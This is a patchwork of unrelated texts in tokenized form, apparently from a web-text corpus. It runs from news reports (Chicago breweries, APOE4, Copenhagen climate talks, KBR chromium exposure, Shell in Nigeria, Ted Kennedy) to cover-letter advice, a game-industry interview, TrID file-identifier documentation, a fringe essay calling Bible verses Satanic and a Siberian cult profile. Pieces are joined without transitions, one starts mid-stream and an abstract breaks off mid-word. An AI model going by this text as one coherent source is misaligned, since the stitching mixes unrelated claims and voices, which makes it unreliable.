As Chicago has morphed from a meat - and - potatoes town to one claiming some of the country ’s best chefs , consumers have started demanding better beer .
While the craft beer movement that exploded in cities like Portland , Ore. , San Francisco and Philadelphia infiltrated Chicago within the last couple of decades , it ’s only lately that the city has experienced a brewing renaissance of its own .
Today , local beer is popping up all over town .
Since October , two new microbreweries have sprouted on the North Side .
Half Acre Beer , which produces three niche beers at its street - facing brewery on Lincoln Avenue , will open a tasting room for the public later this year featuring six draft lines and small - batch guest spirits and beers , and local food like pretzels , mustard and chocolate .
The good news for job seekers , at least if you trust this poll , is that the requirement of a cover letter appears to be waning somewhat .
This most likely has a lot to do with the shift towards sourcing by querying resume databases in lieu of the traditional correspondence directly with a hiring manager approach .
Here is some advice from my perspective as a technical hiring manager regarding cover letters .
Understand that this advice is completely based on my own experience and perspective and may not apply in all situations .
Hiring managers and HR people are unique individuals each with their own preferences and biases that may differ from my own .
Send a cover letter when …
The job posting specifically requests it .
You have names to drop : Someone referred you , or you have a connection at the company that can vouch for you .
You are a really good persuasive writer and showcasing your writing skills in a document other than a highly formatted resume will help your chances .
You want to call out something specific on your resume .
Things to avoid :
Never apologize for things or call out negatives .
“ The 2 your gap in my career was because … ” – Bad
“ I do n’t have this skill you were asking for , but … ” – Bad
Do n’t write a thesis .
Hiring managers have enough to read .
Have a point and get to it quickly .
Do n’t bother saying you are a perfect fit for the position , everyone says that and it just wastes space .
Demonstrate it by mapping the job requirements to your experience .
Never send a cover letter than looks like a template or form letter .
It should look like you wrote it in response to the specific job you are applying for .
Those templating tools for cover letters on Monster.com and Dice where you can apply to a job with one click are the Devil .
Never address them to “ To whom it may concern . ”
Do some digging and find out who the hiring manager is .
In the age of Linked In it is n’t all that hard .
Things to consider :
If you feel you must include a cover letter , but do n’t have any value to add in it , keep it very short ( transmittal letter style ) .
“ I would like to be considered for the XYZ position that I saw posted on Monster.com .
Attached is my resume .
You can contact me at … ”
Have someone proofread your cover letter , not just your resume .
Getting a proofreader is doubly important if the cover letter is n’t in a language that you are extremely proficient in .
Broken English resumes do untold harm to candidates .

The gene most closely linked to an increased risk of developing Alzheimer 's disease affects brain activity in young adults -- much earlier in life than previously reported -- according to researchers at Duke University Medical Center and The Pennsylvania State University .
Study participants in their mid-20s with a gene variant known as APOE4 demonstrated increased brain activity and altered connectivity in parts of the brain that are the first to show signs of Alzheimer 's disease in older adults .
" While young people with and without the APOE4 gene had similar scores on a battery of memory tests , the brains of young people with the gene appear to be working harder or less efficiently to achieve the same results as people without the gene , " said Jeffrey Browndyke , PhD , study co-author and director of the Functional Imaging Neurogenomics of Disease Lab at Duke .
While some researchers have theorized that APOE4 may enhance memory abilities in early life , the new findings suggest that the heightened activity may be the brain 's way of compensating for a weakened ability to create memories .
In addition to the differences seen in an area of the brain known as the medial temporal lobes ( MTL ) , researchers also found differences among people with the APOE4 gene in the MTL 's communication with areas of the brain associated with memory processing .
" APOE4 gene carriers show increased activity in the MTL and increased communication between that region and other brain regions known to be effected by Alzheimer 's disease , while those without the gene tend to show widespread cortical connectivity with the MTL , " said Nancy A. Dennis , PhD , study co-author and assistant professor of Psychology at Penn State .
The study findings are published online in the journal Alzheimer 's & Dementia , the official journal of the Alzheimer 's Association .
Twenty - four healthy adults in their mid-twenties , twelve carriers and twelve non-carriers of the APOE4 gene , completed a memory test while undergoing functional magnetic resonance imaging ( fMRI ) .
The young adults were shown a series of images and asked to provide feedback about what they saw .
The next day participants were brought back to the lab and presented with a surprise test to determine how well they remembered the images .
Brain activity for remembered versus forgotten items was compared between the study groups .
The fMRI data provided the research team with information about the areas of the brain that became active when the individuals looked at pictures that were subsequently remembered a day after the brain scan .
The researchers said that the memory scores of the study participants and their brain structures were comparable in the two groups .
People with and without the APOE4 gene variant were able to recall a similar amount of information and completed the tests with a similar level of accuracy and speed .
There were no differences in the volume of white matter , the communication channels of the brain , or grey matter , the information storage center of the brain .
" While all of the young adults performed similarly and their brains appeared the same , there are clear differences in brain activity and interconnection in people with the APOE4 gene that appear earlier in life than previously observed , " Browndyke said .
" We need to further explore the gene 's effect on brain development and early cognitive function to determine who ultimately is at risk for Alzheimer 's disease . "
The authors caution that the study findings need to be replicated in a larger population of young people with and without the APOE4 gene .
They also said that the gene variant only confers an increased risk for Alzheimer 's disease , not a diagnostic certainty .

US ignorance about the risks and reality of global warming could sink hopes of a new global deal to control greenhouse gas emissions at December 's climate talks in Copenhagen , an advisor to the German government has said .
Professor John Schellnhuber , of the Potsdam Institute for Climate Impact Research in Germany , said the US was " climate illiterate " and that the rest of the world may be forced to agree a new deal without it .
" Nobody should dream of the possibility that numbers and targets for countries will be sealed in Copenhagen , " said Schellnhuber , one of the world 's foremost climate scientists .
" If the US does n't move then nothing will happen . "
He added : " The US in a sense is climate illiterate .
It is a deeper problem in the US , if you look at global polls about what the public knows about climate change .
Even in Brazil and China , you have more people who know the problem , who think that deep cuts in emissions are needed . "
He predicted that it could be several years before the US would be willing to take on carbon cuts that were ambitious enough to persuade countries such as China to set targets of their own .
At UN talks last week , China and India made small steps forward on this issue , but Obama was unable to do the same .
" The political chances seem very slim that something will happen in Copenhagen and even in the years after , " he said .
" Maybe in the conferences following Copenhagen some countries – including China and the EU – whatever the US does , will say : we go ahead now .
Why can't we save the world without the US ?
Why should that not happen ? "
The US has some of the highest carbon emissions per capita in the world , and any deal without it would be significantly less effective at curbing global temperature rise .
Speaking on the fringes of a climate science conference at Oxford University today , Schellnhuber said the former US president , George Bush , was to blame for a decade of inaction on climate change , and that many in the Republican party and the wider US population still did not understand the need to act .
European nations and others have been waiting for President Obama to engage with the issue in a way that Bush refused to .
Schellnhuber said : " Obama is aware of the problem and he personally wants to do something .
The problem is : can he provide the leadership to overcome the system ?
Every top politician gets to do two or three unpopular things , and the right politicians choose the right things . "
To convert a global deal on climate change into US law would require a two - thirds majority vote in the US Senate , something that many in Europe believe is unrealistic given Obama 's ongoing troubles with healthcare reform .
" It just may not be possible to overcome the American inertia , " Scellnhuber said .
Kevin Anderson , director of the Tyndall Centre for Climate Change Research , said : " It 's vital for the climate that we get the Americans on board , but if we can't , then we can't just do nothing – we still need to make the biggest emission cuts that we can .
If that means China and Europe and others going on without the Americans , then that may be the price we need to pay . "
Schellnhuber 's comments come as UN talks on a possible Copenhagen deal continue in Bangkok .
Negotiators from 190 countries are wrestling with a draft treaty text , which runs to 200 pages and is riddled with alternate options and provisional text in square brackets .
His words reflect growing suspicion in Europe that the talks are crawling towards a unsatisfactory outcome , and that little progress is being made in the US .
Earlier this month , the Guardian revealed a growing rift between Europe and the US over the latter 's approach to how carbon targets could be set and met .
The Oxford conference is centred around the implications of a 4C rise in global average temperature , which scientists believe could be a possibility if serious carbon cuts are not agreed in Copenhagen .
Richard Betts , head of climate impacts at the Met Office Hadley Centre , presented a study demonstrating that the world could see a 4C rise as soon as 2060 - 2070 – within the lifetime of many people alive today .
Nigel Arnell , a climate expert at the University of Reading , said a temperature rise on this scale would bring about colossal changes in weather conditions , affecting billions of people .
Some 15 % of land worldwide that is currently suitable for agriculture would become useless , he said .
Available land would shift north , to regions such as Siberia , which is currently covered in forest .
• This article was amended on Tuesday 29 September 2009 .
In the article above we said that the US has by some distance the largest carbon emissions per capita in the world , what we should have said is the US has some of the highest carbon emissions per capita in the world .
This has been changed .
Democrats in the U.S. Senate say the Army and the nation 's largest war contractor failed to protect troops from a " deadly poison " in Iraq and are demanding that the inspector general investigate .
The statement came after a former Oregon Army National Guardsman and three other combat veterans testified before a Senate panel Monday that since being exposed to hexavalent chromium in 2003 , they have been chronically ill and that some of their fellow soldiers have died .
" Before my service to Iraq , I was physically fit .
I used to run several miles without much effort , " said Rocky Bixby of Hillsboro , who struggled to speak between raspy coughs .
" Now I have trouble walking from my house to my car .
I simply run out of breath . "
Sen. Byron Dorgan , D - N.D. , called the Army 's investigation into the exposure " tragically inadequate " and likened it to the government 's mishandling of Agent Orange .
" The Defense Department failed to protect our troops , " Dorgan said .
" And I believe they are downplaying this in part because it is an embarrassment to them . "
The Army has defended its handling of the case and of Kellogg Brown & Root , the company that earned millions in bonuses for restoring Iraqi oil production .
Dorgan spoke at the 20th oversight hearing he has conducted , mostly into the contracts between the Defense Department and KBR , the Houston firm that provides almost all basic services for the U.S. military in Iraq and Afghanistan .
After last year 's hearings , the inspector general reported that KBR 's shoddy electrical work failed to protect a Marine electrocuted in the shower and that it served troops contaminated drinking water .
The troops ' exposure to the industrial chemical first came to light at a June 2008 hearing .
A former KBR safety official testified that he was sent home from Iraq in 2003 after raising concerns about the reddish - orange powder piled at a water treatment plant near Basra .
The plant was needed to restore pressure in nearby oil wells .
Ed Blacke testified that in addition to KBR employees , hundreds of U.S. troops were exposed to the toxic powder as they slept , ate and patrolled the plant between April and August of 2003 .
Among those exposed : members of the 1st Battalion , 162nd Infantry , the first Oregon Guard members sent to Iraq .
But the troops , including others from Indiana and West Virginia , knew almost nothing of the toxin until the state military departments and the Pentagon began mailing letters out earlier this year .
Troops say windstorms whipped up the reddish dust that spilled from hundreds of 100 - pound bags and turned the soldiers into " orange - powdered doughnuts . "
They recalled the constant metallic taste that one veteran described like " a mouthful of pennies . "
But they were never told to use masks and other protective gear they had carried into combat .
And their constant nosebleeds , skin sores and headaches were written off as allergies to desert dust .
" Within two months , you could shine a light into my nasal cavity through a hole that had eaten throughout to the outside of my nose , " testified Russell Kimberling , a former Indiana National Guard commander who was medically evacuated to Germany .
Kimberling was still guarding the plant that August when KBR employees showed up in full protection suits .
The Guard commander escorting them is now in hospice care with lung disease .
Kimberling testified that company officials dismissed the corrosion fighter as a " mild irritant " and that they said one would " literally have to bathe " in it for harm to occur .
Within weeks , the plant was shuttered and cleaned up .
The Army eventually administered blood tests to 137 troops a month later .
The men never received written results .
On Monday , Herman Gibb , an epidemiologist and the Environmental Protection Agency 's former top expert on hexavalent chromium , testified before the Senate 's Democratic Policy Committee that much of the toxin would have been out of the troops ' bodies at the time of the tests .
Gibb likened it to " giving a Breathalyzer to a person three days after they were pulled over for erratic driving . "
Gibb said an epidemiological study based on the military 's medical records was needed , as well as ongoing medical evaluation and care .
Oregon has tried to provide that .
This summer , the Legislature , led by Rep. Chip Shields of Portland , approved money for soldiers who develop cancer as a result .
Some soldiers are also going to court .
Bixby is one of five current and former Oregon Army National Guard members , along with dozens of other soldiers in Indiana and West Virginia , who are suing KBR .
Bixby , a public safety officer at Oregon Health & Science University , told the senators that after receiving his letter earlier this year , the nonsmoker finally had a chest X - ray at Veterans Affairs .
" The doctors discovered I have a node on my lung . "

Cliff Bleszinski may be the face of Epic Games but Mark Rein is the voice .
No tight jeans , diamond earrings or chainsaw - waving japes for him - just a wardrobe full of polo shirts and a great big bundle of opinions .
Eurogamer sat down with Mark Rein and his opinions at the Develop Conference in Brighton last week .
Naturally he banged on about how great Epic's Unreal Engine 3 is , and naturally we asked him stupid questions about Gears of War 3 which he was never going to answer .
Still , read on to find out what Rein reckons to the recent id Software buyout , why he 's excited about Project Natal and what 's going on with Gears of War 3 .
Eurogamer : Hello Mark Rein .
The last time you and I met was at E3 , when the press got to see Project Natal for the first time .
Had you seen it before ?
Mark Rein : Yes .
The two games they showed on stage used our engine , so we 're really excited about that .
I 'm very pro-Natal .
There are a lot of interesting things you could do with it and I 'm really excited to be involved with it .
We 're working closely with Microsoft to spread the enhancements they made with Unreal Engine 3 to other developers .
If people out there are interested in doing really cool games for Natal , they should contact me and I can put them in touch with Microsoft .
Eurogamer :
Is this interview just going to be you hawking your wares for the next 20 minutes ?
Mark Rein : No !
I 'm answering your question about Project Natal !
The whole concept of playing a game without a controller is very intriguing .
That 's going to open up a lot of stuff .
Take EA Sports Active on the Wii .
It 's a great game but it's not very compelling to have to have all that extra hardware attached to your body .
If you made a game like that for Natal - and I 'm sure EA is doing it - Natal could just look at you and tell if you 're doing the exercises properly .
Plus anything could become your controller - a tennis club , a golf club , a gun ...
" I 'd just like to thank my wife , November , my sister , Purple , and of course my brother , Singininthe . "
Eurogamer : A chainsaw ...
Mark Rein :
Or a gun with a chainsaw ...
Eurogamer :
That is where I was going with that , yes .
When you look at Project Natal , what opportunities do you see for the Gears of War and Unreal series ?
Mark Rein :
That 's a hard one .
Our games are really designed for the controller experience .
They 're very twitchy .
I 'm not a hundred per cent sure there 's a good fit there , or that there even needs to be .
I could see doing gestures to other player in multiplayer games , where Natal notices if you 've raised your hand .
I could see maybe using it to throw a grenade .
But I doubt the Gears of War - type experience is what they 're aiming for with Natal .
Eurogamer : Would n't it be nice if you could have a chat with Marcus Fenix though ?
' Hello , how was work ? '
' Yeah not bad , just been doing a bit more war on the Locust horde , ' that sort of thing .
Mark Rein : Milo Fenix ?
I do n't think that 's our thing .
I 'd rather have that conversation with Lara Croft .
With every breath , we intake and expel a complex mix of chemicals .
The quality of the air that we inhale depends on our immediate environment , but what we exhale is based on the biochemical processes occurring in our bodies .
Thus , our exhalation can be used as a health indicator , and should be especially sensitive to the state of our lungs .
Over the years , scientists across multiple disciplines have worked on ways to use exhaled breath for detecting diseases and measuring chemical changes .
The breathalyzer , which estimates blood alcohol content , is a popular example of success in the field ; the method is simple , noninvasive , portable , and affordable .
Diagnosing diseases like lung cancer has proven to be more difficult .
So far , all the methods based on examining the expelled breath require pretreatment of the air , which adds time , money , and complexity to the process .
That has made current techniques too cumbersome for commercial use .
By employing recent developments in nanotechnology , however , researchers from the Israel Institute of Technology have overcome the need to pre-treat exhaled breath for analysis .
The new work appears in the current issue of Nature Nanotechnology .
Hossam Haick , the principal researcher , and his team collected breath samples from 56 healthy volunteers and 40 people who had been diagnosed with lung cancer , but have not received treatment yet .
They analyzed the samples and identified 33 biomarkers , chemicals that were present at significantly distinct levels in the lung cancer patients .
The team devised a sensor system made from nine chemiresistors that could respond to the biomarkers by altering their electrical properties .
The chemiresistors were assembled from gold nanoparticles that are 5nm in diameter and functionalized with different organic compounds that allowed them to sense the biomarkers .
When the researchers exposed the sensors to untreated breath samples , they obtained readings that clearly distinguished between the exhalations of healthy patients and those with lung cancer .
Regardless of the humidity of the breath , the gender of its source , or their smoking habits , the sensors were able to detect the lung cancer biomarkers .
The sensors were also capable of working with a wide range of concentrations , and the process was reversible , meaning the nanoparticles can be reused .
The researchers point out that they need to test their sensors on " a wider population of volunteers to thoroughly probe the influence of diet , alcohol consumption , metabolic state , and genetics . ”
Those experiments are already underway .
The authors neglect to mention if they will try to figure out how sensitive their sensors are to different stages of lung cancer .
All of the cancer subjects in this study had primary stage - 3 or stage - 4 lung cancer , so the disease had already progressed significantly .
It would be important to know if their sensors are useful in stages 1 and 2 of the disease , as being able to diagnose patients in earlier stages would vastly improve their chances of survival .
Haick and his colleagues have shown that it is possible to obtain reliable lung cancer diagnoses from analyzing the exhaled breath using portable equipment that does n't require any pretreatment of the sample .
That is a significant step forward , but as mentioned above , there is definitely room for further development .

Serious questions over Shell Oil 's alleged involvement in human rights abuses in Nigeria emerged last night after confidential internal documents and court statements revealed how the energy giant enlisted the help of the country 's brutal former military government to deal with protesters .
The documents , seen by the IoS , support allegations that Shell helped to provide Nigerian police and military with logistical support , and aided security sweeps of the oil - rich Niger Delta .
Earlier this month Shell agreed to pay $ 15.5 m ( £ 9.6 m ) in a " humanitarian settlement " on the eve of a highly embarrassing US lawsuit .
One of the allegations was that Shell was complicit in the regime 's execution of civilians .
The Anglo - Dutch firm denies any wrongdoing and said it settled to help " reconciliation " .
But the documents contain detailed allegations of the extent to which Shell is said to have co-opted the Nigerian military to protect its interests .
Download the new Independent Premium app Sharing the full story , not just the headlines
The legal settlement came 14 years after the Abacha government hanged nine protesters , including Ken Saro - Wiwa , the environmentalist and writer , after a charade of a trial in 1995 .
Saro - Wiwa led a successful campaign against Shell in his Niger Delta homeland , even forcing the company to quit Ogoniland in 1993 .
The campaign focused on environmental devastation and demanded a greater share of oil revenues for his community .
As the campaign grew , the Ogoni suffered a brutal backlash that left an estimated 2,000 dead and 30,000 homeless .
The documents claim there was systematic collusion with the military and Mobile Police Force ( MPF ) , known as the " Kill and Go " .
Shell has always denied this but is believed to have settled in court as a result of the embarrassing contents .
In one document written in May 1993 , the oil company wrote to the local governor asking for the " usual assistance " as the Ogoni expanded their campaign .
There was a stand - off between the Ogoni and the US contractor Willbros , which was laying a pipeline .
Nigerian military were called in , resulting in at least one death .
Days later ,
Shell met the director general of the state security services to " reiterate our request for support from the army and police " .
In a confidential note Shell suggested : " We will have to encourage follow - through into real action preferably on an industry rather than just Shell basis " .
The Nigerian regime responded by sending in the Internal Security Task Force , a military unit led by Colonel Paul Okuntimo , a brutal soldier , widely condemned by human rights groups , whose men allegedly raped pregnant women and girls and who tortured at will .
Okuntimo boasted of knowing more than 200 ways to kill a person .
In October 1993 , Okuntimo was sent into Ogoni with Shell personnel to inspect equipment .
The stand - off that followed left at least one Ogoni protester dead .
A hand - written Shell note talked of " entertaining 26 armed forces personnel for lunch " and preparing " normal special duty allowances " for the soldiers .
Shell is also accused of involvement with the MPF , which worked with Okuntimo .
One witness , Eebu Jackson Nwiyon , claimed they were paid and fed by Shell .
Nwiyon also recalls being told by Okuntimo to " leave nobody untouched " .
When asked what was meant by this , Nwiyon replied : " He meant shoot , kill . "
One former Shell employee , Kloppenburg Ruud , head of group security in the mid-1990s told lawyers that the deployment of Nigerian security forces at two Shell jetties in the delta was at the company 's request .
Since the settlement , Malcolm Brinded , Shell 's executive director , said : " We wanted to prove our innocence and we were ready to go to court .
We knew the charges against us were not true . "
He added : " I am aware that the settlement may – to some – suggest Shell is guilty and trying to escape justice , " but said this was not the case .
Shell ' lobbied ' Guardian to soften its Nigeria stance
Confidential internal documents reveal how the oil giant lobbied The Guardian newspaper to reduce its support for Saro - Wiwa .
In an assessment of the political and security situation , a Shell executive noted : " The Guardian newspaper ran a much more balanced article on the Ogoni issue , with their position moving from apparent support for Saro - Wiwa to the middle ground .
There is a slight possibility that this may have been influenced by the meeting we had with The Guardian 's editor the week before . "
Peter Preston ,
The Guardian 's editor from 1975 to 1995 , said yesterday that he could not remember a meeting with Shell .
" I have absolutely no memory of one .
And Nigerian politics was never one of my interests . "

Although some of the Bible may be " the breathed word of God , " many humans were responsible for its authorship and it is obvious that some things attributed to God as His will could not possibly come from God for they in no manner reflect the love of God but rather the type of laws , rules , admonitions , decrees , demands , or orders which would have been inspired by Satan .
Therefore it is essential that people learn to detect those verses and passages which are neither God- breathed nor God-inspired .
Following are a few examples of passages which are obviously not the actual will of God :
EXODUS 21:17 : and again in LEVITICUS 21:9  And he who curses his father or his mother shall surely be put to death . 
If God actually wanted us to kill every child who in the throws of growing up , cursed or talked back to his or her parent then the population of our world would be significantly smaller than it is today , and that is not Gods answer to our current overpopulation problem .
EXODUS 21:20 - 21 :  And if a man beats his servant or his maidservant with a rod ( and he or she ) remains alive a day or two , he shall not be punished ; for he ( or she ) is his property .
Does anyone actually believe that employees have ever been personal property in Gods eyes and that killing one is ok because they are nothing more than a piece of property ?
EXODUS 22:19 and also in LEVITICUS 20:15 - 16  Whoever lies with a beast shall surely be put to death . 
If every farm boy who had had a calf , a goat or a sheep as his first girlfriend , was put to death , then we probably wouldnt have enough farmers left to feed the hungry .
God never said that .
EXODUS 31:15  Whoever does ANY work on the Sabbath day , he shall surely be put to death . 
How could anyone who knows the love of God believe that God would have anyone who did any honest work on Sunday , killed ?
LEVITICUS 20:10  The adulterer and the adulteress , shall surely be put to death .
Surely , if throughout history every adulterer and adulteress who had ever lived had been put to death it would have depopulated much of the planet .
That is not to say that adultery is not a sin before God , but He has never been so bloodthirsty that He demanded death for the average sinner .
LEVITICUS 20:13
 If a man lies with a male as he lies with a woman they shall surely be put to death . 
God never said that He would have His children killed who happened to have been born with a God - given genetic heritage which made them prefer members of their same sex as partners .
If this were true we would not have been blessed with the worlds greatest works of art dedicated to God and His Glory .
LEVITICUS 20:27  A man or a woman who is a medium shall surely be put to death . 
God has blessed many men and woman with remarkable spiritual and prophetic skills with which to divine the future and help people .
Why in the world would He have those people whom he has blessed as seers , killed ?
LEVITICUS 24:16  And whoever blasphemes the name of the Lord shall surely be put to death , and all the congregation shall certainly stone him . 
Wow , if everyone on earth who , in a momentary fit of anger , used a blasphemous word , was put to death by their congregation , our churches would be mostly empty .
Surely this is not the law of a loving and forgiving God !!!
LEVITICUS 25:45 -46
 Moreover you may buy the children of strangers and they shall become your property .
And you may take them as an inheritance for your children after you , to inherit them as a possession ; they shall be your permanent slaves . 
This Satanic verse has caused great human misery and injustice for thousands of years .
God never said this !!!
LEVITICUS 26:29
 You shall eat the flesh of your sons , and you shall eat the flesh of your daughters 
If these arent the words of the devil then nothing is !!!
LEVITICUS 27:5
 Your valuation of a ( human ) male shall be twenty shekels , and for a female ten shekels . 
God created both male and female to be equals .
He never said that women were only worth half as much as men .
NUMBERS 15:32-36  they found a man gathering sticks on the Sabbath day Then the Lord said to Moses ,  The man must surely be put to death 
So as the Lord commanded Moses , all the congregation brought him outside the camp and stoned him with stones , and he died . 
God would have said  Thou shall not kill .
It was obviously Satan who told Moses to kill the poor stick gatherer .
NUMBERS 31:15 - 18  And Moses said to them :  Have you kept all the women alive ?
Now therefore kill every male among the little ones ; and kill every woman who has known a man intimately .
But keep alive for yourselves all the young girls 
This is genocide and ethnic cleansing  at its worst obviously it was Satan who was misleading Moses certainly not a loving and forgiving God .
These are the just a few of the verses from only three books of the Bible in which men of God were tricked by Satan into believing that they were writing down or doing Gods will .
God has ordained ETHICIUS with the difficult mission of expunging from the mostly Holy Bible , any passage which reflects a cruel , abusive , bigoted , unjust , unforgiving , or mean - spirited god , rather than the TRUE BEAUTY AND LOVE OF THE ONE AND ONLY CREATOR OF OUR INFINITE UNIVERSE AND THE LOVE OF HIS SON JESUS CHRIST .

Abstract
The generic function of a feedforward neural net is to map patterns from one space to another .
This mapping function , determined by the set of examples used to train the network , may be viewed as a hashing function -- the Neuro - Hasher .
This paper reports the experiments on using a backpropagation network with a dynamic hidden layer for finding an appropriate hashing function for a given population of hashing keys .
Comparative studies show that the Neuro - Hasher performs robustly over various populations of scarce hashing keys which would cause uneven distributions with some traditional hashing function .
1 . Introduction Hashing is a technique for randomising the locations in a linear space where the records are stored and indexed directly on the basis of a given hashing key .
Traditional hashing functions are discontinuous and predetermined , aiming at randomising some sort of continuous sequence of hashing keys , e.g. integers [ KNU73 ] .
However , such hashing functions may lead to uneven d...
WASHINGTON ( CNN ) --
For writer John Aravosis , Edward " Ted " Kennedy 's early support for gay rights was very important to a community that has faced a history steeped in discrimination .
Gay rights advocates say Sen .
Ted Kennedy was a staunch supporter for their cause .
" On gay rights , he was absurdly helpful for a straight senator back before gay rights were popular , " he said .
Aravosis , who runs AmericaBlog -- a political site that often focuses on gay rights issues -- said it was Kennedy who sparked his interest in the movement .
" For me it was particularly personal since he gave me my start in gay rights , " he said .
" I started doing volunteer work in his office in 1993 when I was still working for a Republican senator . "
Unabashedly liberal , Kennedy had a long track record in support of gay rights .
Former Massachusetts state Sen. Jarrett Barrios -- and incoming President of the Gay & Lesbian Alliance Against Defamation praised the Democratic senator 's work .
" In those early years , his support may have turned heads but [ that ] did n't dampen his support -- and eventually helped change hearts and minds about LGBT [ Lesbian , Gay , Bisexual and Transgender ] equality in the Senate and around the country , " he said in a statement .
Kennedy 's death , Barrios noted , is deeply personal .
" He was a friend whom I worked with on many issues in the Massachusetts senate , and my husband Doug and I have the print he gave us for our wedding framed at home , " he said .
" His passing is a loss for many of us who knew him , and all of us who benefited from his uncompromising support of our full equality . "
Since his death warm wishes and remembrances have poured in from the gay community around the country .
Marc Solomon , marriage director of Equality California , said he lost " one of my heroes . "
" Thank you Sen .
Kennedy , for making a future for us all that is more compassionate , more equitable , more just -- for LGBT people , for immigrants , for people of color , for those living in poverty , for every one of us .
Your passion for justice and your fight burn on in us all , " he wrote Thursday in Bay Windows , an LGBT newspaper serving New England .

Human Rights Campaign President Joe Solmonese said the nation has " lost its greatest champion and strongest voice for justice , fairness , and compassion .
The loss to our community is immeasurable . "
" There was no greater hero for advocates of LGBT equality than Sen. Ted Kennedy , " he said in a statement .
Solmonese 's group has repeatedly given Kennedy a 100 percent on its congressional scorecards for supporting gay rights .
" From the early days of the AIDS epidemic , to our current struggle for marriage equality he has been our protector , our leader , our friend .
He has been the core of the unfinished quest for civil rights in this country and there is now a very painful void , " Solmonese said .
Kennedy co-sponsored the 1990 Ryan White CARE
Act , which passed the same year .
Later in 1996 , he co-sponsored a bill to reverse the discharge of HIV - positive members of the military .
He was also a staunch defender of hate crimes legislation in his Senate career .
Kennedy was a key sponsor of the 2009 Matthew Shepard Hate Crimes Prevention
Act , named after young gay man who was killed .
The bill was approved by the Senate in July .
" No member of the LGBT community should be terrified to walk down the street for fear of hateful violence .
Hate crimes perpetrators must not be allowed to place our communities in fear , " he has said in the past .
Kennedy also opposed the military 's " Do n't ask , Don't tell " policy adopted in 1993 .
The policy , which is still in place , ended the military 's practice of asking potential service members if they were gay , but required the dismissal of openly gay service members .
And on the controversial topic of same - sex marriage , Kennedy was at the forefront of opposing legislative efforts seeking to ban it .
In 1996 , he opposed the Clinton - era Defense of Marriage Act -- which is currently the law -- and fought to repeal it throughout the years .
" America stands for justice for all .
Congress must make clear that when we say ' all ' we mean all .
America will never be America until we do , " he said in a 2007 statement .
In 2004 , Kennedy lent his voice to the gay marriage debate in 2004 when the Massachusetts Supreme Court approved of same - sex marriage .
It was the first state in the nation to do so , and paved the way for others states -- including Connecticut , Iowa , Maine , New Hampshire and Vermont -- to follow suit .
" He played a critical role in helping protect the right of same - sex couples to marry in his beloved home state of Massachusetts , " Solomon said .
But Kennedy 's views on same - sex marriage have come at odds with not only the Republican party , but also with close friends and allies in his own party -- most notably with President Obama , who is against same - sex marriage .
Despite the differences , Kennedy -- known for reaching across the aisle to get legislation passed -- was steadfast , advocates note , in his support for equal rights .
For Solomon , Kennedy 's commitment and work was a truly enlightening experience .
" Working with Sen .
Kennedy meant working in his aura .
His work was always surrounded with mystique , " he said .

TrID - File Identifier TrID is an utility designed to identify file types from their binary signatures .
While there are similar utilities with hard coded logic , TrID has no fixed rules .
Instead , it 's extensible and can be trained to recognize new formats in a fast and automatic way .
TrID has many uses : identify what kind of file was sent to you via e-mail , aid in forensic analysis , support in file recovery , etc .
TrID uses a database of definitions which describe recurring patterns for supported file types .
As this is subject to very frequent update , it 's made available as a separate package .
Just download both TrID and this archive and unpack in the same folder .
The database of definitions is constantly expanding ; the more that are available , the more accurate an analysis of an unknown file can be .
You can help !
Use the program to both recognize unknown file types and develop new definitions that can be added to the library .
See the TrIDScan page for information about how you can help .
Just run the TrIDScan module against a number of files of a given type .
The program will do the rest .
Because TrID uses an expandable database it will never be out of date .
As new file types become available you can run the scan module against them and help keep the program up to date .
Other people around the world will be doing the same thing making the database a dynamic and living thing .
If you have special file formats that only you use , you can also add them to your local database , making their identification easier .
To get you started , the current library of definitions is up to 13123 file types and growing fast .
TrID is simple to use .
Just run TrID and point it to the file to be analyzed .
The file will be read and compared with the definitions in the database .
Results are presented in order of highest probability .

Wildcards can be used to scan groups of files , entire folders , etc .
In addition , using the switch - ae will instruct TrID to add the guessed extensions to the filenames .
This come handy , for example , when working with files recovered by data rescue softwares .
For example : C: \TrID > trid c:\temp\* -ae TrID /32 - File Identifier v2.24 - ( C ) 2003 - 16 By M.Pontello Definitions found : 5702 Analyzing ...

At this point , the files in the c:\temp folder will look like : FILE0001.CHK.bav
FILE0002.CHK.ogg
FILE0003.CHK.doc
FILE0004.CHK.exe
Instead , the switch - ce will just change the file extension to the new one ; if the file has no extension , the new one will be added .
For example : IAmASoundFile.dat -> IAmASoundFile.wav
IAmABitmap -> IAmABitmap.bmp
TrID can get a file list from stdin , with the -@ switch .
So it 's possible to work on an entire folder tree , or a particular subset of files , just using the output of some other command through a pipe .
Something like : C: \TrID > dir d:\recovered_drive /s /b | trid -ce -@ Definitions found : 5702 Analyzing ...
File : d:\recovered_drive

77.8 % ( .OGG ) OGG Vorbis Audio ( 14014/3 ) ...
It 's possible to tell TrID to show some more information about every match ( such as the mime type , who created that definition , how many files were scanned , etc. ) ; and it's also possible to limit the number of results shown .
The switch -v activate the verbose mode , and -r:nn specifies the max number of matches that TrID will display .
Default is 5 for normal mode , 2 for verbose , 1 for multi-files analysis .

When starting , TrID will check for the TrIDDefs .
TRD definitions package in the current directory .
If not found , it will search on the some folder where TrID is installed .
Eventually , it 's possible to specify a particular defs file with the switch - d : filespec .
To force TrID to wait for a key after showing the results , the -w switch is provided .
To speed up the process of getting the latest updated definitions , it 's possible to use the TrIDUpdate Python script .
It first compare the MD5 digest of the current TRD file and the one available online , so if the file is n't changed it 's very quick .
For example : c:\TrID>tridupdate.py

Sergei Torop was a traffic cop in the small Russian town of Minusinsk until 1989 , when he announced that he was the son of God .
Now he commands a following of thousands and rules over a large swath of the Siberian mountains .
Ian Traynor makes a pilgrimage
Four thousand feet up a mountain deep in the Siberian taiga , the middle - aged man appears in a velvet crimson robe , long brown hair framing a beatific smile .
He sits down in a log cabin perched on the brow of the hill .
It is a room with a stunning view .
The snowy Sayan mountains sparkle in the distance .
The silver and pink of the birch forests shimmer in the clear sunlight .
Down to the right , the pure blue water of Lake Tiberkul mesmerises .
Behind the cabin , for much further than the eye can see - a thousand kilometres - the Siberian wilderness stretches , bereft of human habitation .
" It 's all very complicated , " he starts quietly .
" But to keep things simple , yes , I am Jesus Christ .
That which was promised must come to pass .
And it was promised in Israel 2,000 years ago that I would return , that I would come back to finish what was started .
I am not God .
And it is a mistake to see Jesus as God .
But I am the living word of God the Father .
Everything that God wants to say , he says through me . "
Meet the Messiah of Siberia , Vissarion Christ - the Teacher , as he is known to his thousands of disciples , who are convinced that he is the reincarnation of Jesus of Nazareth , come back to earth to save the world .
